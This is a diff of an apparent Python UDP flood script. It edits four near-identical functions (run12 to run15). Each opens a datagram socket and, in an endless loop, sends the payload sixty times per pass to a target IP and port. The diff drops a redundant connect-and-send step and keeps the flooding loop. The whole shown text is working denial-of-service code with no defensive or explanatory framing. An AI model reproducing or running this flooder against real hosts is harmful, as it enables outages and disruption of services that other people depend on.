@@ -119,8 +119,6 @@ def run12():
 	while True:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			s.connect((str(ip),int(port)))
-			s.send(data)
 			for x in range(60):
 				s.sendto(data,addr)
 
@@ -129,8 +127,6 @@ def run13():
 	while True:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			s.connect((str(ip),int(port)))
-			s.send(data)
 			for x in range(60):
 				s.sendto(data,addr)
 
@@ -139,8 +135,6 @@ def run14():
 	while True:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			s.connect((str(ip),int(port)))
-			s.send(data)
 			for x in range(60):
 				s.sendto(data,addr)
 
@@ -149,8 +143,6 @@ def run15():
 	while True:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			s.connect((str(ip),int(port)))
-			s.send(data)
 			for x in range(60):
 				s.sendto(data,addr)
 
